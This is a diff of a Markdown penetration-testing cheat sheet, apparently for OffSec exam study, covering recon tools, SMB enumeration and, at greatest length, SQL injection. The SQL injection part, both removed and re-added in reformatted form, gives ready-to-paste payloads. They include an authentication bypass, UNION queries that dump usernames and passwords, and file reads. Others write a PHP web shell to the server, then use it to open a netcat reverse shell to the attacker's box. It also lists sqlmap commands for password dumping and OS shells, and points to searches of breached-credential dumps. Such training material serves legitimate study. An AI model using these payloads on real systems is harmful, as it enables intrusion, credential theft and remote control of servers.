@@ -2,43 +2,15 @@
 
 A Pastables File: A quick reference sheet to cut and paste from.
 
-## MISC
+***
+
+## Getting Setup
 
 ### IRC Joining up with OffSec Team
 
 `/msg NickServ IDENTIFY <password>`
 
 `/join #offsec`
-
-### How to "save" the IP Address of a target and pass it in CLI
-
-`export tgt=<targets IP>` and then test it, `echo $tgt`
-
-Save the attack IP box
-
-`export me=<kali box ip>`
-
-### tar (compression ops) commands
-
-`tar -czf target.tar tardir` Remember as "tar *c*ompress *z*ee *f*iles!
-
-`tar xzf target.tar` can be remembered as "tar *x*pand *z*ee *f*ile!
-
-tar up the root folder (c: create,f: file, j: compress bzip, p: preserve permissions, v: verbose)
-
-`tar -cfjpv root.tar.gz /root/`
-
-untar the root folder (x: extract, j: bzip, p: preserve, v: verbose)
-
-`tar -xvf ./rootfolder.tar.gz --overwrite --directory /`
-
-Untar a tar.gz file
-
-`tar xvzf archive.tar.gz`
-
-packages used below that may not be included by default in Kali
-
-`apt-get install seclists gobuster`
 
 ### 2019.4 Setting up Non-Root Kali
 
@@ -109,7 +81,204 @@ Replace newline with a comma
 
 `tr "\n" ","`
 
-## Enumeration
+***
+
+## Common Linux Commands
+
+Hardwire Interface Configs
+```console
+ifconfig
+```
+
+Wireless Interface Configs
+```console
+iwconfig
+```
+
+Send ICMP aka PING
+```console
+ping -c 1 $tgt
+```
+
+Save the target as a variable and reduce mistakes
+```console
+export tgt=<targets IP>
+```
+
+Save the attack IP box
+```
+export me=<kali box ip>
+```
+
+Watch for new connections
+```
+watch ss -tunapl
+```
+
+See network connections
+```
+netstat -plant
+```
+
+See routing table
+```
+route
+```
+
+### tar (compression ops) commands
+
+Remember as "tar *c*ompress *z*ee *f*iles!
+
+```tar -czf target.tar tardir```
+
+Can be remembered as "tar *x*pand *z*ee *f*ile!
+
+```tar xzf target.tar```
+
+tar up the root folder (c: create,f: file, j: compress bzip, p: preserve permissions, v: verbose)
+
+`tar -cfjpv root.tar.gz /root/`
+
+untar the root folder (x: extract, j: bzip, p: preserve, v: verbose)
+
+`tar -xvf ./rootfolder.tar.gz --overwrite --directory /`
+
+Untar a tar.gz file
+
+`tar xvzf archive.tar.gz`
+
+packages used below that may not be included by default in Kali
+
+`apt-get install seclists gobuster`
+
+***
+
+## Passive Recon
+
+### Hunter.io
+
+[hunter.io](https://hunter.io) - email address schemes of the target company
+
+### WeLeakInfo
+
+[weleakinfo.com](https://weleakinfo.com) - Search cred dumps from previous breaches for your target company etc.  Look for password re-use, domain memberships etc.
+
+
+### crt sh
+
+[crt.sh](https://crt.sh) - A peek at the subdomains etc. by viewing the certificates issued to the target.
+
+### OWASP Amass
+
+Pre-installed in Kali now.
+
+Switch|Commands
+---|---
+intel|Discover targets for enumeration
+enum|Perform enumerations and network mappings
+viz|Visualize enumeration results
+track|Track differences between enumerations
+db|Manipulate the Amass graph database
+
+```
+amass intel -whois -d targetsite.com
+```
+
+[User manual](https://github.com/OWASP/Amass/blob/master/doc/user_guide.md)
+
+[Example Config File](https://github.com/OWASP/Amass/blob/master/examples/config.ini)
+
+### The Harverster
+
+Switch | Function
+---|---
+-d|Target Domain
+-b|Data Source (Some requrie API Keys)
+-l|Limit number of results
+-f|Output to HTML,XML, or both
+-g|Use google dorking instead of normal search
+-n|Perform DNS Reverse Query on all Domains Discovered
+
+### sublist3r
+
+Switch|Function
+---|---
+-d|Domain
+-t|Threads
+-b|Enable bruteforce module
+
+### Tomnomnom
+
+Feed it lists to test and see if the sites are actually alive.
+
+Install
+```
+go get -u github.com/tomnomnom/httprobe
+```
+
+Send probes of list of domains
+```
+cat recon/example/domains.txt | httprobe
+```
+### Builtwith
+
+[Built With](https://builtwith.com) - A great way to see what the website is running on and a lot of info on the technology it uses.
+
+### Wappalyzer
+
+[Wappalyzer](https://wappalyzer.com) - Browser extention that as you browse the website it tells you what the site runs on. Install through the App Store for your browser.
+
+### Whatweb
+
+```
+whatweb [options] <URLS>
+```
+
+Function|Switch
+---|---
+-i|Input File
+-a|Agression level
+
+Great at showing actual version numbers and headers.
+
+### Burp Suite
+
+SetUp
+
+1. Switch Firefox to Proxy:
+	- Set Proxy Server to 127.0.0.1:8080 and check 'Use this proxy for all protocols' or Setup FoxyProxy
+2. Accept the Burp Cert
+	- https://burp and accept cert then click 'CA Certificate'
+	- Download it
+	- Now in Preferences
+		- Privacy and Security
+		- View Certs
+		- Import the cert and Check both boxes
+
+Now to Use for Passive Recce
+
+1. Proxy Tab -> Inetercept
+	- Intercept On or Off
+	- If Intercept is on you may need to click 'Forward' to send request
+2. Click around the site to passively map and find further info in header exchanges
+
+### Google Dorking
+
+Switch|Function
+---|---
+site|Narrow search to site
+filetype|Narrow search to filetype
+-|Not (Great to look for subdomain. i.e: site:microsoft -site:www)
+intitle:|Search Page Title
+allintitile|Search Page Title
+intext|Search text of page only
+inurl|Search URL
+
+[More operators](https://en.wikipedia.org/wiki/Google_hacking)
+
+***
+
+## Scanning and Enumeration
 
 Objectives:
 1. TCP and UDP Ports
@@ -124,7 +293,6 @@ Objectives:
     - In short look for the way in....
 
 [0 Day Security Guide to Enumeration](http://www.0daysecurity.com/penetration-testing/enumeration.html) - Fantastic and covers a lot of services.
-
 
 ### Common Tool and Common Switches
 
@@ -345,12 +513,10 @@ Connect to //[name of <03>]/[name of share]
 ```bash
 smbclient //<machine name>/wwwroot -I $tgt -N
 ```
-
 Check null
 ```bash
 smbclient -L \\\\$tgt -N
 ```
-
 Mount Up...
 ```bash
 smbclient ////TARGET/Backups -I $tgt -N
@@ -764,7 +930,7 @@ the following info:
 - Note Row 1 wasn't selected because of what was matched in Column 6.
 - Only the first 3 columns were selected because of the query
 
-#### Testing if its vulnerable
+**Testing if its vulnerable**
 
 Goals:
 1. Find out if it is sending unfiltered data to the db
@@ -782,176 +948,216 @@ Does it look for stings? Does a **'** break the backend query by passing the **'
 
 `/article.php?id=1'      (added a ' to the end)`
 
-#PROPER EXAMPLES OF SQL WE ARE TRYING TO BREAK (What is under the hood):
-#SELECT id,name FROM users where name='test' and id=3;
-#or
-#SELECT id,name FROM users where ( name='test' and id=3 );
-#If for example the injection point is at the word test we can try and break it with
-#odd numbers of ' or ( or ) OR adding comment delimiters to break the query such as -- or # or */
+**PROPER EXAMPLES OF SQL WE ARE TRYING TO BREAK (What is under the hood):**
 
-#Does it break? Add a ' to the end of the line
-http://$tgt/comment.php?id=738'
+`SELECT id,name FROM users where name='test' and id=3;`
 
-******************************* MAPPING IT *************************************
-Goals:
+or
+
+`SELECT id,name FROM users where ( name='test' and id=3 );`
+
+If for example the injection point is at the word test we can try and break it with odd numbers of `'` or `(` or `)` **or** adding comment delimiters to break the query such as `--` or `#` or `*/`
+
+**Does it break? Add a ' to the end of the line**
+
+`http://$tgt/comment.php?id=738'`
+
+
+**Mapping Out the Backend**
+
+__Goals:__
 1. How many columns?
 2. Find the 'viewport'... where can we make data appear?
 3. Columns and table names?
-********************************************************************************
-# How many columns are being pushed to the page?
-# Columns Discovery: first instance of a break it is 1 too high.
-http://$tgt/comment.php?id=738 order by 7 #if it breaks at 7 there are 6 columns
+***
+**How many columns are being pushed to the page?**
+**Columns Discovery: first instance of a break it is 1 too high.**
 
-#Weld attacking request with victims. Keep it balanced...
-union all select
+`http://$tgt/comment.php?id=738 order by 7`
 
-#Map the columns to their data.  Look for a column that lends to easy Data display... like the comments column
-http://$tgt/comment.php?id=738 union all select @@version,2,3,4,5,6
-# then 1,@@version,3,4..... then 1,2,@@version,4 (moving it until it shows up- thats your 'viewport')
+if it breaks at 7 there are 6 columns. Weld attacking request with victims. Keep it balanced...
 
-#Mysql commands handy to inject:
-#Current user logged in?
-user()
-current_user()
-#Version
-version()
-@@version
-#current DB
-database()
+`union all select`
 
-# Map the names of tables... looking for something juicy like users etc. (Column 5 is the 'viewport')
-http://$tgt/comment.php?id=738 union all select 1,2,3,4,table_name,6 FROM information_schema.tables
-table_name,6 FROM information_schema.tables
+Map the columns to where they output their data to the page.  Look for a column that lends to easy Data display... 
 
-# Map the columns of a particular table... for example users.
-http://$tgt/comment.php?id=738 union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users'
+Example: the comments column
 
-# Or from pentesterlab... a more organized method.
-1 UNION SELECT 1, table_name, column_name,4 FROM information_schema.columns
+`http://$tgt/comment.php?id=738 union all select @@version,2,3,4,5,6`
 
-# But wait... the window is only 1 column? concat them!
-1 UNION SELECT 1,concat(table_name,':', column_name),3,4 FROM information_schema.columns
+Then `1,@@version,3,4`
 
-#Your desired info is probably near the end as the first load of tables are for MySQL itself.
+Then `1,2,@@version,4` (moving it until it shows up- thats your 'viewport')
 
-**********************QUICK KILL ADMIN LOGIN**************************
-# Authentication Bypass
-# This essentially selects the first line of users.  If its an admin
-# it may log yo in as admin. Place this into the name input box if Admin is the first.
-wronguser' or 1=1 LIMIT 1;#
 
-# The SQL SELECT LIMIT statement is used to retrieve records from one or more tables in
-# a database and limit the number of records returned based on a limit value.
-# TIP: SELECT LIMIT is not supported in all SQL databases. For databases such as SQL Server
-# or MSAccess, use the SELECT TOP statement to limit your results.
+Another way to think about what we are doing:
 
-# Going for the kill... Attempt to extract usernames and passwords Note 0x3a = ':'
-http://$tgt/comment.php?id=738 union select 1,2,3,4,concat(name,0x3a,password),6 FROM users
-0x3a is ':'
-
-# To read the contents of a file on target server file system
-http://$tgt/comment.php?id=-1 union select all 1,2,3,4,load_file(‘c:/windows/system32/drivers/etc/hosts’),6
-
-# Writing to a file on the Servers File System
-http://$tgt/comment.php?id=738 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'
-
-# Using the created backdoor to call home:
-http://$tgt/backdoor.php?cmd=nc -n $me 443 -e cmd.exe
-
-# Blind SQL Injection using the sleep function   if the server sleeps it indicates it might be SQLi Vulnerable
-http://$tgt/comment.php?id=738-sleep(5)
-
-# To check sql version via blind SQLi timing method... if version is equal to X then sleep 5
-http://$tgt/comment.php?id=738-sleep(5)-IF(MID(@@version,1,1)='5', SLEEP(5), 0)
-
-# Shell via dropdown Post Parameter... AKA Proxy attack
-Lang=  'union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor4.php
-
-So far..
 ' UNION SELECT 1,2,3,4,@@version,6 #
-^                                  ^
-First breaks and drops            Terminator prevents raising us back up since there is a hidden '
+
+^ First break is the `'`.................................^ Second Break is the `#`
+
+- The leading `'` breaks the query and begins interacting with the DB directly as commands
+- We can assume there is a "hidden" `'` just to the right of the input field, so we add a `#` at the end to negate that and keep out list of commands as commands.
+
+Why the `#`?  DRAW THIS OUT!!!!
+
+`'union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor7.php`
+
+- First `'` breaks it. It is the opener
+- The `'` after OUTFILE is the closer
+- We dont terminate this one because we need the hidden `'` If there wasn't a hidden one we would add a `'#`
+
+The whole key here is figuring out if there is a hidden `'` at the end of the input box and where else we need a `'` . For example, we need a `'` encasing around the file destination.
+
+**To map out all data fields in one shot**
+
+Simply place a number as string in each column.
+
+`union select "1","2","3","4","5","6"`
+
+Now you can see by number where the column displays to the page. For example, you will see a 6 display on the page where the 6th column displays.  Hunt for a good spot to display the data you are going to be dumping.
+
+**Mysql commands handy to inject:**
+
+Current user logged in: `user()` or `current_user()`
+
+Version: `version()` or `@@version`
+
+Current DB: `database()`
+
+Map the names of tables... looking for something juicy like users etc. (Column 5 is the display area we have chosen to leak the data in the following example):
+
+`http://$tgt/comment.php?id=738 union all select 1,2,3,4,table_name,6 FROM information_schema.tables`
+
+Map the columns of a particular table... for example users.
+
+`http://$tgt/comment.php?id=738 union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users'`
+
+Or from pentesterlab... a more organized method.
+
+`1 UNION SELECT 1, table_name, column_name,4 FROM information_schema.columns`
+
+But wait... the window is only 1 column? concat them!
+
+`1 UNION SELECT 1,concat(table_name,':', column_name),3,4 FROM information_schema.columns`
+
+Your desired info is probably near the end as the first load of tables are for MySQL itself.
+
+**QUICK KILL ADMIN LOGIN**
+
+Authentication Bypass - This essentially selects the first line of users.  If its an admin it may log you in as admin. Place this into the name input box if Admin is the first.
+
+`wronguser' or 1=1 LIMIT 1;#`
+
+The SQL SELECT LIMIT statement is used to retrieve records from one or more tables in a database and limit the number of records returned based on a limit value. ***TIP***: `SELECT LIMIT` is not supported in *all* SQL databases. For databases such as SQL Server or MSAccess, use the `SELECT TOP` statement to limit your results.
+
+Going for the kill... Attempt to extract usernames and passwords. *Note* 0x3a = ':'
+
+`http://$tgt/comment.php?id=738 union select 1,2,3,4,concat(name,0x3a,password),6 FROM users`
+
+**Commands to Attack The Back End**
+***
+
+To read the contents of a file on target server file system
+
+`http://$tgt/comment.php?id=-1 union select all 1,2,3,4,load_file(‘c:/windows/system32/drivers/etc/hosts’),6`
+
+Writing to a file on the Servers File System
+
+`http://$tgt/comment.php?id=738 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'`
+
+Using the created backdoor to call home:
+
+`http://$tgt/backdoor.php?cmd=nc -n $me 443 -e cmd.exe`
+
+Blind SQL Injection using the sleep function   if the server sleeps it indicates it might be SQLi Vulnerable
+
+`http://$tgt/comment.php?id=738-sleep(5)`
+
+To check sql version via blind SQLi timing method... if version is equal to X then sleep 5
+
+`http://$tgt/comment.php?id=738-sleep(5)-IF(MID(@@version,1,1)='5', SLEEP(5), 0)`
+
+Shell via dropdown Post Parameter... AKA Proxy attack
+
+`Lang=  'union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor4.php`
+
+***
+**SQLMAP**
+
+Quick Examples
+
+`sqlmap -u $tgt --crawl=1`
+
+`sqlmap -u $tgt/discoveredinjectpoint.php?id=738 --dbms=mysql --dump --threads=5`
+
+`sqlmap -u $tgt/discoveredinjectpoint.php?id=738 --dbms=mysql --os-shell`
+
+`--cookie="security=low; PHPSESSID=oikbs8qcic2omf5gnd09kihsm7"`
+
+`--headers="User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:25.0) Gecko/20100101 Firefox/25.0" --cookie="security=low; PHPSESSID=oikbs8qcic2omf5gnd09kihsm7" -u 'http://localhost/dvwa/vulnerabilities/
+sqli_blind/?id=1-BR&Submit=Submit#' --level=5 risk=3 -p id`
+
+SQLMap Progressive Scanning/Attack with POST DATA
+
+What are we dealing with?
+
+`sqlmap - u $tgt/url --dbms=mysql --forms --banner`
+
+Who are the DB users.... not user data but the users administering the DB
+
+`sqlmap - u $tgt/url --dbms=mysql --forms --banner --users`
+
+Get those users? passwords?
+
+`sqlmap - u $tgt/url --dbms=mysql --forms --banner --users --passwords`
+
+Enumerate the server and its DB that the user has access to
+
+`sqlmap - u $tgt/url --dbms=mysql --forms --banner --dbs`
+
+Enumerate a particular DB
+
+`sqlmap - u $tgt/url --dbms=mysql --forms --banner -D $targetDB`
+
+What are the Tables?
+
+`sqlmap - u $tgt/url --dbms=mysql --forms --banner -D $targetDB --tables`
+
+what are the columns?
+
+`sqlmap - u $tgt/url --dbms=mysql --forms --banner -D $targetDB -T $tgttable --columns`
+
+Target the columns you want
+
+`sqlmap - u $tgt/url --dbms=mysql --forms --banner -D $targetDB -T $tgttable -C name,of,columns --dump`
+
+-levels 1-5- Default 1. Controls the numbers of payloads it tries.  For example, user agents, cookies etc. it starts attacking all of them.
+- Risk 1-3- The higher the number the riskier the attack.  A higher level of risk could corrupt and crash the database.
+
+`--technique=` manually select the type of attack. Specify which one you know works to save time.
+
+`sqlmap -u http://$tgt/ --crawl=20 --threads=5 --forms --batch --dbms=mysql --dbs  `
 
 
-Investigate further......  Why the #?  DRAW THIS OUT!!!!
-'union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor7.php
-^                                                                                 ^                             ^
-|---------------------------------------------------------------------------------|-----------------------------|
-First one breaks it.                                      This one encases the file string...              We dont terminate this one because we need the hidden ' =OR= use '#
+***
+ORACLE DB
 
+`http://oracleserver:port/pls/simpledad?admin_/globalsettings.htm`
 
-The whole key here is figuring out if there is a hidden ' at the end of the input box and where else we need a ' ... for example we need a ' encasing around the file destination
+`select * from v$version`
 
-++++++++SQLMAP++++++++++++++
+`select * from global_name`
 
-sqlmap -u $tgt --crawl=1
+`select table_name FROM all_tables;`
 
-sqlmap -u $tgt/discoveredinjectpoint.php?id=738 --dbms=mysql --dump --threads=5
+`select owner, table_name FROM all_tables;`
 
-sqlmap -u $tgt/discoveredinjectpoint.php?id=738 --dbms=mysql --os-shell
+`SELECT column_name FROM all_tab_columns WHERE table_name = 'blah';`
 
---cookie="security=low; PHPSESSID=oikbs8qcic2omf5gnd09kihsm7"
+`SELECT column_name FROM all_tab_columns WHERE table_name = 'blah' and owner = 'foo';`
 
---headers="User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:25.0) Gecko/20100101 Firefox/25.0" --cookie="security=low; PHPSESSID=oikbs8qcic2omf5gnd09kihsm7" -u 'http://localhost/dvwa/vulnerabilities/
-sqli_blind/?id=1-BR&Submit=Submit#' --level=5 risk=3 -p id
-
-
-++++++sqlmap progressive++++++++  POST DATA
-#What are we dealing with?
-sqlmap - u $tgt/url --dbms=mysql --forms --banner
-
-#Who are the DB users.... not user data but the users administering the DB
-sqlmap - u $tgt/url --dbms=mysql --forms --banner --users
-
-#Get those users? passwords?
-sqlmap - u $tgt/url --dbms=mysql --forms --banner --users --passwords
-
-#Enumerate the server and its DB that the user has access to
-sqlmap - u $tgt/url --dbms=mysql --forms --banner --dbs
-
-#Enumerate a particular DB
-sqlmap - u $tgt/url --dbms=mysql --forms --banner -D $targetDB
-
-#What are the Tables?
-sqlmap - u $tgt/url --dbms=mysql --forms --banner -D $targetDB --tables
-
-#what are the columns?
-sqlmap - u $tgt/url --dbms=mysql --forms --banner -D $targetDB -T $tgttable --columns
-
-#Target the columns you want
-sqlmap - u $tgt/url --dbms=mysql --forms --banner -D $targetDB -T $tgttable -C name,of,columns --dump
-
-#levels 1-5- Default 1. Controls the numbers of payloads it tries.  For example, user agents, cookies etc. it starts attacking all of them.
-
-#Risk 1-3- The higher the number the riskier the attack.  A higher level of risk could corrupt and crash the database.
-
-#--technique= manually select the type of attack. Specify which one you know works to save time.
-
-sqlmap -u http://$tgt/ --crawl=20 --threads=5 --forms --batch --dbms=mysql --dbs  
-
-PAYDAY EXERCISE
-csid =  ' AND SLEEP(5) #
-' AND SLEEP(5) AND 'TSXP'='TSXP&redirect_url=index.php&user_login=ncri&password=
-
-==========================================================================================
-					ORACLE DB
-==========================================================================================
-http://oracleserver:port/pls/simpledad?admin_/globalsettings.htm
-
-select * from v$version
-
-select * from global_name
-
-select table_name FROM all_tables;
-
-select owner, table_name FROM all_tables;
-
-SELECT column_name FROM all_tab_columns WHERE table_name = 'blah';
-
-SELECT column_name FROM all_tab_columns WHERE table_name = 'blah' and owner = 'foo';
-
-SELECT column_name FROM all_tab_columns WHERE table_name = 'USER$' and owner = 'SYS';
-
+`SELECT column_name FROM all_tab_columns WHERE table_name = 'USER$' and owner = 'SYS';`
 
 ***
 
